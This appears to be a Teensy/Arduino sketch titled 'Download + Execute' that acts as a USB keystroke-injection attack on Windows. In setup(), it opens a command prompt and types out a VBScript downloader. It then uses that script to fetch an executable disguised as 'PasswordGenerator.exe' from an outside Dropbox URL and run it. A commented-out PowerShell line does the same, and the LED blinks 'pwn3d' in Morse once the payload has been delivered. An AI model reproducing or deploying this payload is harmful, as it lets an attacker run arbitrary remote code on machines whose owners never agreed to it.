/***
 *        ____                          __                   __            ______                          __      
 *       / __ \ ____  _      __ ____   / /____   ____ _ ____/ /    __     / ____/_  __ ___   _____ __  __ / /_ ___ 
 *      / / / // __ \| | /| / // __ \ / // __ \ / __ `// __  /  __/ /_   / __/  | |/_// _ \ / ___// / / // __// _ \
 *     / /_/ // /_/ /| |/ |/ // / / // // /_/ // /_/ // /_/ /  /_  __/  / /___ _>  < /  __// /__ / /_/ // /_ /  __/
 *    /_____/ \____/ |__/|__//_/ /_//_/ \____/ \__,_/ \__,_/    /_/    /_____//_/|_| \___/ \___/ \__,_/ \__/ \___/ 
 *        __              ____                                                                                     
 *       / /_   __  __   / __ \ ____  __  __ _____ __  __                                                          
 *      / __ \ / / / /  / / / //_  / / / / // ___// / / /                                                          
 *     / /_/ // /_/ /  / /_/ /  / /_/ /_/ // /   / /_/ /                                                           
 *    /_.___/ \__, /   \____/  /___/\__,_//_/    \__,_/                                                            
 *           /____/                                                                                                
 */

// LED pin number, 13 for 3.1
// 11 for 2 and 2.x
int LED_PIN = 13;

// delay length (in ms)
int ds = 200;
// morse delay length (in ms)
int morseD = 250;

void setup() {
  
  // let it initialize
  delay(1000);
  
  // put the pin into output mode
  pinMode(LED_PIN, OUTPUT);
  
  // turn on the LED pin so we know it's running
  digitalWrite(LED_PIN, HIGH);
  
  delay(1000);
  
  // windows key + R = run
  sendCmd(KEY_R);
  
  typeln("cmd");
  
  typeCmd("del download.vbs");
  
  typeCmd("copy con download.vbs");
  
  typeCmd("Set args = WScript.Arguments:a = split(args(0), \"/\")(UBound(split(args(0),\"/\")))");
  
  typeCmd("Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\"):objXMLHTTP.open \"GET\", args(0), false:objXMLHTTP.send()");
  
  typeCmd("If objXMLHTTP.Status = 200 Then");
  
  typeCmd("Set objADOStream = CreateObject(\"ADODB.Stream\"):objADOStream.Open");
  
  typeCmd("objADOStream.Type = 1:objADOStream.Write objXMLHTTP.ResponseBody:objADOStream.Position = 0");
  
  typeCmd("Set objFSO = Createobject(\"Scripting.FileSystemObject\"):If objFSO.Fileexists(a) Then objFSO.DeleteFile a");
  
  typeCmd("objADOStream.SaveToFile a:objADOStream.Close:Set objADOStream = Nothing ");
  
  typeCmd("End if:Set objXMLHTTP = Nothing:Set objFSO = Nothing");
  
  ctrl(KEY_Z);
  
  typeln("");
  
  typeln("cscript download.vbs https://dl.dropboxusercontent.com/u/60602481/PasswordGenerator.exe");
  
  typeln("PasswordGenerator.exe && exit");
  
  
  //typeln('powershell -noexit new-object System.Net.WebClient.DownloadFile("https://dl.dropboxusercontent.com/u/60602481/PasswordGenerator.exe','%TEMP%\file.exe"); Start-Process "%TEMP%\file.exe"');
  
}

void loop() {
 flutter();
 // celebratory flutterring of LED commence
 dot();
 dash();
 dash();
 dot();
 // p
 dot();
 dash();
 dash();
 //w
 dash();
 dot();
 //n
 dot();
 dot();
 dot();
 dash();
 dash();
 //3
 dash();
 dot();
 dot();
 //d
 flutter();
 // whoop there it is (again)
 
}

void typeln(String chars)
{
  // gotta make our own println function
  Keyboard.print(chars);
  delay(ds);
  Keyboard.println("");
  delay(ds * 4);
}

void typeCmd(String chars)
{
  // gotta make our own println function
  Keyboard.print(chars);
  delay(25);
  Keyboard.println("");
  delay(25);
}

void sendCmd(int key)
{
  mod(MODIFIERKEY_GUI, key);
  delay(ds);
}

void alt(int key)
{
  mod(MODIFIERKEY_ALT, key);
}

void ctrl(int key)
{
  mod(MODIFIERKEY_CTRL, key);
}

void k(int key)
{
  Keyboard.set_key1(key);
  Keyboard.send_now();
  delay(1);
  
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(1);
}


// morse code dot
void dot() { 
 digitalWrite(LED_PIN, HIGH);
 delay(morseD);
 digitalWrite(LED_PIN, LOW);
 delay(morseD);
}

// morse code dash
void dash() {
 digitalWrite(LED_PIN, HIGH);
 delay(morseD * 3);
 digitalWrite(LED_PIN, LOW);
 delay(morseD);
}

// induce a seizure in the observer - #prostrats  
void flutter() {
  
 digitalWrite(LED_PIN, HIGH);
 delay(100);
 digitalWrite(LED_PIN, LOW);
 delay(100);
 digitalWrite(LED_PIN, HIGH);
 delay(100);
 digitalWrite(LED_PIN, LOW);
 delay(100);
 digitalWrite(LED_PIN, HIGH);
 delay(100);
 digitalWrite(LED_PIN, LOW);
 delay(100);
 digitalWrite(LED_PIN, HIGH);
 delay(100);
 digitalWrite(LED_PIN, LOW);
 delay(100);
 digitalWrite(LED_PIN, HIGH);
 delay(100);
 digitalWrite(LED_PIN, LOW);
 delay(100);
 
}

// custom modifier method
void mod(int mod, int key)
{
  Keyboard.set_modifier(mod);
  Keyboard.send_now();
  Keyboard.set_key1(key);
  Keyboard.send_now();
  delay(ds);

  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(ds);
}